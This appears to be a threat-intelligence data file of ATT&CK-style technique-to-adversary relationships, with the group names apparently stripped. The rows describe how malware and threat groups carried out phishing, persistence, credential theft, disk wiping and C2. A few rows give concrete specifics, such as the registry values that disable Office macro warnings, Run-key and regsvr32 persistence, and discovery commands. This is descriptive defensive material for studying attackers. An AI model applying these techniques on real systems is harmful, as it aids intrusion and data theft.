Screen Capture,malware can take screenshots of the compromised computer every minute.,relationship
Data from Local System,has collected files from infected systems and uploaded them to a C2 server.,relationship
Component Object Model,malware can insert malicious macros into documents using a Microsoft.Office.Interop object.,relationship
Web Service,has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.,relationship
Scheduled Task,has created a scheduled task to launch an executable every 10 minutes.,relationship
Compile After Delivery,has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.,relationship
Binary Padding,has obfuscated .NET executables by inserting junk code.,relationship
File and Directory Discovery,macros can scan for Microsoft Word and Excel files to inject with additional malicious macros.  has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.,relationship
Disable or Modify Tools,has delivered macros which can tamper with Microsoft Office security settings.,relationship
Internal Spearphishing,has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.,relationship
Modify Registry,has removed security settings for VBA macro execution by changing registry values HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings and HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM.,relationship
Obfuscated Files or Information,has delivered self-extracting 7z archive files within malicious document attachments and used obfuscated or encrypted scripts.,relationship
Office Application Startup,has inserted malicious macros into existing documents providing persistence when they are reopened.  has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option once the Application.Startup event is received.,relationship
Native API,malware has used CreateProcess to launch additional malicious components.,relationship
Automated Exfiltration,has used modules that automatically upload gathered documents to the C2 server.,relationship
Automated Collection,has deployed scripts on compromised systems that automatically scan for interesting documents.,relationship
Data from Network Shared Drive,malware has collected Microsoft Office documents from mapped network drives.,relationship
Rundll32,malware has used rundll32 to launch additional malicious components.,relationship
Taint Shared Content,has injected malicious macros into all Word and Excel documents on mapped network drives.,relationship
Spearphishing Attachment,sent emails to victims with malicious Microsoft Office documents attached.,relationship
Disable or Modify Tools,malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.,relationship
Portable Executable Injection,malware can download a remote access tool  and inject into another process.,relationship
Shortcut Modification,malware can create a .lnk file and add a Registry Run key to establish persistence.,relationship
Windows Command Shell,malware can use cmd.exe to download and execute payloads and to execute commands on the system.,relationship
Native API,malware can leverage the Windows API call CreateProcessA() for execution.,relationship
Ingress Tool Transfer,malware can download additional files from C2 servers.,relationship
Uncommonly Used Port,has used a variant of  that communicates with its C2 server over port 6666.,relationship
Malicious File,attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.,relationship
Deobfuscate/Decode Files or Information,malware can decode contents from a payload that was Base64 encoded and write the contents to a file.,relationship
Process Hollowing,malware can use process hollowing to inject one of its trojans into another process.,relationship
Registry Run Keys / Startup Folder,malware can create a .lnk file and add a Registry Run key to establish persistence.,relationship
PowerShell,malware can use PowerShell commands to download and execute a payload and open a decoy document on the victims machine.,relationship
Modify Registry,malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\Software\Microsoft\Office\.,relationship
Visual Basic,has used macros in s as well as executed VBScripts on victim machines.,relationship
Hidden Window,has used -W Hidden to conceal  windows by setting the WindowStyle parameter to hidden. ,relationship
Uncommonly Used Port,C2 servers communicated with malware over TCP 8081 8282 and 8083.,relationship
File Deletion,Malware used by  is capable of remotely deleting files from victims.,relationship
Screen Capture,Malware used by  is capable of watching the victim's screen.,relationship
Obfuscated Files or Information,disguised its malicious binaries with several layers of obfuscation including encrypting the files.,relationship
Keylogging,Malware used by  is capable of capturing keystrokes.,relationship
Bypass User Account Control,uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.,relationship
AppCert DLLs,service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.,relationship
File Deletion,removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.,relationship
Archive Collected Data,adds collected files to a temp.zip file saved in the %temp% folder then base64 encodes it and uploads it to control server.,relationship
Process Discovery,gathers a list of processes using the tasklist command and then is sent back to the control server.,relationship
System Information Discovery,gathers computer name and information using the systeminfo command.,relationship
Windows Service,has batch files that modify the system service COMSysApp to load a malicious DLL.,relationship
Local Data Staging,adds collected files to a temp.zip file saved in the %temp% folder then base64 encodes it and uploads it to control server.,relationship
File and Directory Discovery,service-based DLL implant traverses the FTP servers directories looking for files with keyword matches for computer names or certain keywords.,relationship
Deobfuscate/Decode Files or Information,drops a Word file containing a Base64-encoded file in it that is read decoded and dropped to the disk by the macro.,relationship
Obfuscated Files or Information,drops files with base64-encoded data.,relationship
Registry Run Keys / Startup Folder,uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.,relationship
Modify Registry,uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.,relationship
Process Injection,uses a batch file to load a DLL into the svchost.exe process.,relationship
Data from Local System,collects data from the local victim system.,relationship
Code Signing,uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.,relationship
Service Execution,launches a DLL file that gets executed as a service using svchost.exe,relationship
File Transfer Protocols,uses FTP for command and control.,relationship
Automated Exfiltration,performs data exfiltration is accomplished through the following command-line command: from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt.,relationship
Visual Basic,embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.,relationship
Windows Command Shell,Several commands are supported by the 's implant via the command-line interface and theres also a utility to execute any custom command on an infected endpoint.  used batch scripting.,relationship
Spearphishing Attachment,has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.,relationship
System Information Discovery,has used a reconnaissance module to gather information about the operating system and hardware on the infected host.,relationship
Process Discovery,has used a reconnaissance module to identify active processes and other associated loaded modules.,relationship
Web Service,has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.,relationship
Regsvr32,has ensured persistence at system boot by setting the value regsvr32 %path%\ctfmonrn.dll /s.,relationship
Domain Groups,has used specific malware modules to gather domain membership.,relationship
Symmetric Cryptography,has encrypted network communications with AES.,relationship
Registry Run Keys / Startup Folder,has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\.,relationship
Multi-hop Proxy,used chains of compromised routers to proxy C2 communications between them and cloud service providers.,relationship
Malicious File,lured victims into clicking malicious files for machine reconnaissance and to execute malware.,relationship
Credentials from Web Browsers,used a browser plugin to steal passwords and sessions from Internet Explorer Chrome Opera Firefox Torch and Yandex.,relationship
Web Protocols,has used HTTP HTTPS and WebDav in network communications.,relationship
Exploitation for Client Execution,has exploited CVE-2012-0158 CVE-2014-1761 CVE-2017-11882 and CVE-2018-0802 for execution.,relationship
File and Directory Discovery,used a file listing plugin to collect information about file and directories both on local and remote drives.,relationship
Obfuscated Files or Information,has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.,relationship
Template Injection,has used decoy documents to load malicious remote payloads via HTTP.,relationship
Visual Basic,has used VBScript to execute malicious commands and payloads.,relationship
PowerShell,has used PowerShell to execute malicious commands and payloads.,relationship
Data from Local System,used a file hunting plugin to collect .txt .pdf .xls or .doc files from the infected host.,relationship
Mshta,has used malicious HTA files to drop and execute malware.,relationship
Software Discovery,has enumerated installed software on compromised systems.,relationship
Data from Local System,gathered information and files from local directories for exfiltration.,relationship
System Service Discovery,performs service discovery using net start commands.,relationship
Archive via Utility,is known to use RAR with passwords to encrypt data prior to exfiltration.,relationship
System Information Discovery,performs operating system information discovery using systeminfo.,relationship
Domain Groups,performs discovery of permission groups net group /domain.,relationship
Domain Account,performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.,relationship
Remote Email Collection,used a .NET tool to dump data from Microsoft Exchange mailboxes.,relationship
Remote System Discovery,has used network scanning and enumeration tools including .,relationship
System Network Configuration Discovery,performs local network configuration discovery using ipconfig.,relationship
LSASS Memory,has dumped credentials including by using .,relationship
Command and Scripting Interpreter,Malware used by  can run commands on the command-line interface.,relationship
Golden Ticket,has used  to generate Kerberos golden tickets.,relationship
SMB/Windows Admin Shares,actors have been known to copy files to the network shares of other computers to move laterally.,relationship
File and Directory Discovery,uses command-line interaction to search files and directories.,relationship
Windows Service,backdoor RoyalDNS established persistence through adding a service called Nwsapagent.,relationship
External Remote Services,regained access after eviction via the corporate VPN solution with a stolen VPN certificate which they had extracted from a compromised host.,relationship
Sharepoint,used a SharePoint enumeration and data dumping tool known as spwebmember.,relationship
Registry Run Keys / Startup Folder,Several  backdoors achieved persistence by adding a Run key.,relationship
Process Discovery,performs process discovery using tasklist commands.,relationship
Exfiltration Over C2 Channel,transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.,relationship
System Network Connections Discovery,performs local network connection discovery using netstat.,relationship
Windows Command Shell,has used batch scripts in its malware to install persistence mechanisms.,relationship
Web Protocols,malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.,relationship
Keylogging,has used keyloggers.,relationship
Archive Collected Data,The  group has been known to compress data before exfiltration.,relationship
Service Execution,has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.,relationship
Right-to-Left Override,has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.,relationship
DNS,malware RoyalDNS has used DNS for C2.,relationship
Local Account,performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.,relationship
Security Account Manager,has dumped credentials including by using gsecdump.,relationship
LSA Secrets,has dumped credentials including by using gsecdump.,relationship
Create Process with Token,keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.,relationship
Account Manipulation,malware WhiskeyDelta-Two contains a function that attempts to rename the administrators account.,relationship
Drive-by Compromise,delivered  to victims via a compromised legitimate website.,relationship
Hidden Files and Directories,has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.,relationship
Dynamic-link Library Injection,A  malware sample performs reflective DLL injection.,relationship
Compiled HTML File,has used CHM files to move concealed payloads.,relationship
Bootkit,malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.,relationship
Remote Desktop Protocol,malware SierraCharlie uses RDP for propagation.,relationship
File Deletion,malware deletes files in various ways including suicide scripts to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim. ,relationship
Registry Run Keys / Startup Folder,malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.,relationship
Spearphishing Attachment,has targeted victims with spearphishing emails containing malicious Microsoft Word documents.,relationship
Local Data Staging,malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory then compressed encrypted and uploaded to a C2 server.,relationship
Standard Encoding,A  malware sample encodes data with base64.,relationship
Keylogging,malware KiloAlfa contains keylogging functionality.,relationship
Commonly Used Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic which includes commonly used ports such as 443 53 80 25 and 8080.,relationship
Exfiltration Over C2 Channel,malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another  malware sample also performs exfiltration over the C2 channel.,relationship
Obfuscated Files or Information,malware uses multiple types of encryption and encoding in its malware files including AES Caracachs RC4 basic XOR with constant 0xA7 and other techniques.,relationship
File and Directory Discovery,Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories including a Destover-like variant that lists files and gathers information for all drives.,relationship
System Owner/User Discovery,Various  malware enumerates logged-on users.,relationship
Disable or Modify Tools,malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. During a 2019 intrusion  disabled Windows Defender and Credential Guard as some of their first actions on host. ,relationship
Timestomp,Several  malware families use timestomping including modifying the last write timestamp of a specified Registry key to a random date as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.,relationship
Web Protocols,malware has conducted C2 over HTTP and HTTPS.,relationship
System Time Discovery,A Destover-like implant used by  can obtain the current system time and send it to the C2 server.,relationship
Data from Local System,malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine then archives and encrypts the directories before uploading to its C2 server.  has used wevtutil to export Window security event logs. ,relationship
Shortcut Modification,A  malware sample adds persistence on the system by creating a shortcut in the users Startup folder.,relationship
Application Window Discovery,malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.,relationship
LSASS Memory,leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.  has also used a custom version  to capture credentials. ,relationship
Exploitation for Client Execution,has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.,relationship
System Network Configuration Discovery,malware IndiaIndia obtains and sends to its C2 server information about the first network interface cards configuration including IP address gateways subnet mask DHCP information and whether WINS is available.,relationship
Windows Service,Several  malware families install themselves as new services on victims.,relationship
Query Registry,malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present including SecureCRT Terminal Services RealVNC TightVNC UltraVNC Radmin mRemote TeamViewer FileZilla pcAnyware and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt.,relationship
Windows Management Instrumentation,malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.,relationship
Process Discovery,Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.,relationship
Ingress Tool Transfer,Several  malware families are capable of downloading and executing binaries from its C2 server.,relationship
Archive Collected Data,malware RomeoDelta archives specified directories in .zip format encrypts the .zip file and uploads it to its C2 server. ,relationship
External Proxy,uses multiple proxies to obfuscate network traffic from victims.,relationship
SMB/Windows Admin Shares,malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.,relationship
Fallback Channels,malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random and if the transmission fails chooses a new C2 server to attempt the transmission again.,relationship
Password Spraying,malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames which center around permutations of the username Administrator and weak passwords.,relationship
Malicious File,has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.,relationship
Uncommonly Used Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic which includes uncommonly used ports such as 995 1816 465 1521 3306 and many others.,relationship
Multiband Communication,Some  malware uses multiple channels for C2 such as RomeoWhiskey-Two which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.,relationship
Archive via Library,malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib encrypted and uploaded to a C2 server.,relationship
Symmetric Cryptography,Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic. Other  malware uses Caracachs encryption to encrypt C2 payloads.,relationship
System Information Discovery,Several  malware families collect information on the type and version of the victim OS as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server..,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.,relationship
Service Stop,has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.,relationship
Disk Structure Wipe,malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.,relationship
Disk Content Wipe,has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and finally attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.,relationship
Data Destruction,has used a custom secure delete function to overwrite file contents with data from heap memory.,relationship
Resource Hijacking,has subset groups like Bluenoroff who have used cryptocurrency mining software on victim machines.,relationship
System Shutdown/Reboot,has rebooted systems after destroying files and wiping the MBR on infected systems.,relationship
Windows Command Shell,malware uses cmd.exe to execute commands on victims. A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.,relationship
Protocol Impersonation,malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method evading SSL man-in-the-middle decryption attacks.,relationship
Disable or Modify System Firewall,Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using . ,relationship
Internal Defacement,replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a ,relationship
Archive via Custom Method,A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.,relationship
Non-Standard Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic creating port-protocol mismatches.,relationship
Spearphishing via Service,has used fake job advertisements sent via LinkedIn to spearphish victims. ,relationship
Security Support Provider,has rebooted victim machines to establish persistence by installing a SSP DLL.,relationship
Modify Registry,has modified registry keys using the reg windows utility for its custom backdoor implants.,relationship
Masquerade Task or Service,A  custom backdoor implant included a custom PE loader named Security Package that was added into the lsass.exe process via registry key. ,relationship
Software Packing,has used Themida to pack at least two separate backdoor implants.,relationship
Visual Basic,has used VBScript to gather information about a victim machine. ,relationship
PowerShell,has used Powershell to download malicious payloads.,relationship
Mshta,has used mshta.exe to run malicious scripts and download programs.,relationship
Network Service Scanning,scanned network services to search for vulnerabilities in the victim system.,relationship
Password Spraying,used a tool called Total SMB BruteForcer to perform internal password spraying.,relationship
LSASS Memory,used several tools for retrieving login and password information including LaZagne and Mimikatz.,relationship
Local Account,used a tool called Imecab to set up a persistent remote access account on the victim machine.,relationship
File and Directory Discovery,used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.,relationship
Drive-by Compromise,has infected victims using watering holes.,relationship
Obfuscated Files or Information,obfuscated scripts that were used on victim machines.,relationship
Remote Email Collection,used a tool called MailSniper to search through the Exchange server mailboxes for keywords.,relationship
JavaScript/JScript,infected victims using JavaScript code.,relationship
Remote System Discovery,used Microsofts Sysinternals tools to gather detailed information about remote systems.,relationship
Process Doppelgänging,has used  to evade security software while deploying tools on compromised systems.,relationship
Credentials In Files,used several tools for retrieving login and password information including LaZagne.,relationship
LSA Secrets,used several tools for retrieving login and password information including LaZagne.,relationship
Cached Domain Credentials,used several tools for retrieving login and password information including LaZagne.,relationship
Credentials from Password Stores,used several tools for retrieving login and password information including LaZagne.,relationship
Credentials from Web Browsers,used several tools for retrieving login and password information including LaZagne.,relationship
Windows Command Shell,uses a backdoor known as BADFLICK that is is capable of generating a reverse shell and has used multiple types of scripting for execution including JavaScript and JavaScript Scriptlets in XML..,relationship
BITS Jobs,has used  to download additional tools.,relationship
Regsvr32,has used regsvr32 for execution.,relationship
Visual Basic,has used VBScript.,relationship
Deobfuscate/Decode Files or Information,has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.,relationship
Exploitation for Client Execution,has exploited multiple Microsoft Office and .NET vulnerabilities for execution including CVE-2017-0199 CVE-2017-8759 and CVE-2017-11882.,relationship
Obfuscated Files or Information,has obfuscated code using base64 and gzip compression.,relationship
Local Data Staging,has used C:\Windows\Debug and C:\Perflogs as staging directories.,relationship
PowerShell,has used PowerShell for execution.,relationship
Valid Accounts,has used valid compromised email accounts for defense evasion including to send malicious emails to other victim organizations.,relationship
Registry Run Keys / Startup Folder,has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.,relationship
Ingress Tool Transfer,has downloaded additional scripts and files from adversary-controlled servers.,relationship
Windows Management Instrumentation,has used WMI for execution.,relationship
Shortcut Modification,has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.,relationship
One-Way Communication,has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.,relationship
Windows Management Instrumentation Event Subscription,has used WMI for persistence.,relationship
Spearphishing Attachment,has sent spearphishing emails with malicious attachments including .rtf .doc and .xls files.,relationship
Spearphishing Link,has sent spearphishing emails with links often using a fraudulent lookalike domain and stolen branding.,relationship
Binary Padding,has inserted garbage characters into code presumably to avoid anti-virus detection.,relationship
Malicious File,has sent spearphishing attachments attempting to get a user to click.,relationship
Code Signing,has used stolen code signing certificates to sign malware.,relationship
SSH,used ssh for internal reconnaissance.,relationship
OS Credential Dumping,has used publicly available tools to dump password hashes including . ,relationship
Remote Desktop Protocol,has targeted RDP credentials and used it to move through the victim environment. ,relationship
Web Shell,relies on web shells for an initial foothold as well as persistence into the victim's systems. ,relationship
Exfiltration to Cloud Storage,has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.,relationship
Malicious Link,has sent spearphishing email links attempting to get a user to click.,relationship
LSASS Memory,has used publicly available tools to dump password hashes including ProcDump and WCE. ,relationship
Spearphishing Attachment,has delivered spearphishing emails that contain a zipped file with malicious contents.,relationship
Spearphishing Link,has sent phishing emails that contain a link to an external server with ZIP and RAR archives.,relationship
Python,used multiple compiled Python scripts on the victims system.,relationship
Obfuscated Files or Information,employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,relationship
File Transfer Protocols,malware used FTP for C2.,relationship
Registry Run Keys / Startup Folder,used the startup folder for persistence.,relationship
Local Data Staging,created their own directories to drop files into.,relationship
Data from Removable Media,had a module in its malware to find encrypt and upload files from fixed and removable drives.,relationship
Scheduled Task,used scheduled tasks for persistence.,relationship
Standard Cryptographic Protocol,has relied on TLS-encrypted FTP to transfer data out of target environments. ,relationship
Malicious File,has has relied on users opening malicious attachments delivered through spearphishing to execute malware.,relationship
Web Protocols,malware used Pythons urllib library to make HTTP requests to the C2 server.,relationship
Malicious Link,has has relied on users opening malicious links delivered through spearphishing to execute malware.,relationship
Fast Flux DNS,has used free dynamic DNS domains for C2.,relationship
Commonly Used Port,malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.,relationship
File and Directory Discovery,malware can list a victim's logical drives and the type as well the total/free space of the fixed devices. Other malware can list a directory's contents.,relationship
Ingress Tool Transfer,has downloaded additional code and files from servers onto victims.  used Wrapper/Gholee custom-developed malware which downloaded additional malware to the infected system.,relationship
Visual Basic,malware has used VBS scripts for execution.,relationship
Local Email Collection,has collected .PST archives.,relationship
Windows Command Shell,has used the command-line interface.,relationship
System Owner/User Discovery,malware has obtained the victim username and sent it to the C2 server.,relationship
System Network Configuration Discovery,malware gathers the victim's local IP address MAC address and external IP address.,relationship
Obfuscated Files or Information,malware has used base64-encoded commands and files and has also encrypted embedded strings with AES.,relationship
System Information Discovery,malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version UUID and computer/host name to send to the C2 server.,relationship
Uncommonly Used Port,malware has communicated with its C2 server over ports 4443 and 3543.,relationship
Archive via Utility,has used RAR to stage and compress local folders.,relationship
Registry Run Keys / Startup Folder,malware has used Registry Run keys to establish persistence.,relationship
PowerShell,has used PowerShell for execution and privilege escalation.,relationship
File Deletion,has deleted and overwrote files to cover tracks.,relationship
Process Discovery,malware can list running processes.,relationship
Spearphishing Link,sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.,relationship
Bidirectional Communication,malware can use a SOAP Web service to communicate with its C2 server.,relationship
Web Protocols,malware has used HTTP for C2.,relationship
Keylogging,malware is capable of keylogging.  used CWoolger and MPK custom-developed malware which recorded all keystrokes on an infected system.,relationship
LSASS Memory,stole domain credentials from Microsoft Active Directory Domain Controller and leveraged .,relationship
Screen Capture,malware can take a screenshot and upload the file to its C2 server.,relationship
Hidden Window,malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.,relationship
Application Layer Protocol,malware has used IRC for C2.,relationship
Exchange Email Delegate Permissions,granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. ,relationship
Non-Standard Port,malware has communicated with its C2 server over TCP port 4443 using HTTP.,relationship
Spearphishing Attachment,has used personalized spearphishing attachments.,relationship
Credentials from Web Browsers,used FireMalv custom-developed malware which collected passwords from the Firefox browser storage.,relationship
Malicious File,has lured victims into executing malicious files.,relationship
Spearphishing via Service,used various social media channels to spearphish victims.,relationship
Binary Padding,has been known to employ binary padding.,relationship
Obfuscated Files or Information,has compressed the  executable within malicious email attachments.  has also encrypted payloads before they are downloaded to victims.,relationship
Malicious File,malicious spearphishing attachments required a user to open the file after receiving.,relationship
Spearphishing Attachment,delivered spearphishing emails with malicious documents PDFs or Excel files attached.,relationship
Malicious Link,spearphishing emails required a user to click the link to connect to a compromised website.,relationship
Spearphishing Link,delivered spearphishing emails with malicious links included.,relationship
Credentials from Web Browsers,used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.,relationship
Process Discovery,actors obtained a list of active processes on the victim and sent them to C2 servers.,relationship
Code Signing,has used forged Microsoft code-signing certificates on malware.,relationship
Registry Run Keys / Startup Folder,saved malicious files within the AppData and Startup folders to maintain persistence.,relationship
Ingress Tool Transfer,used executables to download malicious files from different sources.,relationship
Obfuscated Files or Information,has delivered compressed executables within ZIP files to victims.,relationship
Malicious Link,has sent malicious links via email.,relationship
Malicious File,has sent malicious files via email.,relationship
Spearphishing Attachment,has sent phishing emails with malicious attachments.,relationship
Spearphishing Link,has sent phishing emails with malicious links included.,relationship
Visual Basic,used various implants including those built with VBScript on target machines.,relationship
JavaScript/JScript,used various implants including those built with JS on target machines.,relationship
PowerShell,used PowerShell implants on target machines.,relationship
Deobfuscate/Decode Files or Information,decompresses ZIP files once on the victim machine.,relationship
Command and Scripting Interpreter,used various implants including those built on .NET on target machines.,relationship
Match Legitimate Name or Location,has used filenames and Registry key names associated with Windows Defender.,relationship
Registry Run Keys / Startup Folder,has added Registry Run key KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding to establish persistence.,relationship
Spearphishing Attachment,has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.,relationship
LSASS Memory,has performed credential dumping with .,relationship
System Owner/User Discovery,has used malware that can collect the victims username.,relationship
Windows Management Instrumentation,has used malware that leveraged WMI for execution and querying host information.,relationship
Screen Capture,has used malware that can capture screenshots of the victims machine.,relationship
Bypass User Account Control,uses various techniques to bypass UAC.,relationship
Deobfuscate/Decode Files or Information,decoded base64-encoded PowerShell commands using a VBS file.,relationship
Obfuscated Files or Information,has used Daniel Bohannons Invoke-Obfuscation framework. The group has also used other obfuscation methods including Base64 obfuscation of VBScripts and PowerShell commands.,relationship
Rundll32,has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.,relationship
CMSTP,has used CMSTP.exe and a malicious INF to execute its  payload.,relationship
Malicious File,has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.,relationship
Dynamic Data Exchange,has used malware that can execute PowerShell scripts via DDE.,relationship
Security Software Discovery,has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.,relationship
Windows Command Shell,has used a custom tool for creating reverse shells.  has used JavaScript files to execute its  payload.,relationship
Ingress Tool Transfer,has used malware that can upload additional files to the victims machine.,relationship
External Proxy,has controlled  from behind a proxy network to obfuscate the C2 location.  has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).,relationship
Process Discovery,has used malware to obtain a list of running processes on the system.,relationship
Archive via Utility,has used the native Windows cabinet creation tool makecab.exe likely to compress stolen data to be uploaded.,relationship
Credentials In Files,has run a tool that steals passwords saved in victim email.,relationship
Component Object Model,has used malware that has the capability to execute malicious code via COM DCOM and Outlook.,relationship
Mshta,has used mshta.exe to execute its  payload and to pass a PowerShell one-liner for execution.,relationship
System Information Discovery,has used malware that can collect the victims OS version and machine name.,relationship
PowerShell,has used PowerShell for execution.,relationship
File and Directory Discovery,has used malware that checked if the ProgramData folder had folders or files with the keywords Kasper Panda or ESET.,relationship
System Network Configuration Discovery,has used malware to collect the victims IP address and domain name.,relationship
Compile After Delivery,has used the .NET csc.exe tool to compile executables from downloaded C# code.,relationship
Multi-Stage Channels,has used one C2 to obtain enumeration scripts and monitor web logs but a different C2 to send data back. ,relationship
Credentials from Web Browsers,has run a tool that steals passwords saved in victim web browsers.,relationship
Steganography,has stored obfuscated JavaScript code in an image file named temp.jpg.,relationship
Visual Basic,has used VBScript files to execute its  payload as well as macros.,relationship
LSA Secrets,has performed credential dumping with .,relationship
Cached Domain Credentials,has performed credential dumping with .,relationship
Credentials from Password Stores,has performed credential dumping with  and other tools including by dumping passwords saved in victim email.,relationship
Web Protocols,has used HTTP for C2 communications.,relationship
Exploitation for Client Execution,has exploited the Office vulnerability CVE-2017-0199 for execution.,relationship
Standard Encoding,has base64 encoded C2 communications.,relationship
Office Template Macros,has used a Word Template Normal.dotm for persistence.,relationship
Scheduled Task,has used scheduled tasks to establish persistence.,relationship
Exfiltration Over C2 Channel,has used C2 infrastructure to receive exfiltrated data.,relationship
System Network Configuration Discovery,uses commands such as netsh interface show to discover network interface settings.,relationship
Security Software Discovery,uses commands such as netsh advfirewall firewall to discover local firewall settings.,relationship
DLL Side-Loading,has used DLL side-loading to load malicious DLL's into legitimate executables.,relationship
Malicious File,has convinced victims to open malicious attachments to execute malware.,relationship
Add-ins,has used the RoyalRoad exploit builder to drop a second stage loader intel.wll into the Word Startup folder on the compromised host.,relationship
Spearphishing Attachment,has used malicious e-mail attachments to deliver malware.,relationship
Security Account Manager,has dumped account hashes with  and cracked them with Cain & Abel.,relationship
Exploit Public-Facing Application,has performed SQL injection attacks of extranet web servers to gain access.,relationship
Disable or Modify Tools,has disabled anti-virus and anti-spyware tools in some instances on the victims machines. The actors have also disabled proxy settings to allow direct communication from victims to the Internet.,relationship
Spearphishing Link,sent spearphishing emails containing links to compromised websites where malware was downloaded.,relationship
Web Protocols,has used HTTP for C2.,relationship
Valid Accounts,has used compromised VPN accounts to gain access to victim systems.,relationship
Commonly Used Port,has used ports 25 and 80 for C2 communications.,relationship
Obfuscated Files or Information,A  DLL included an XOR-encoded section.,relationship
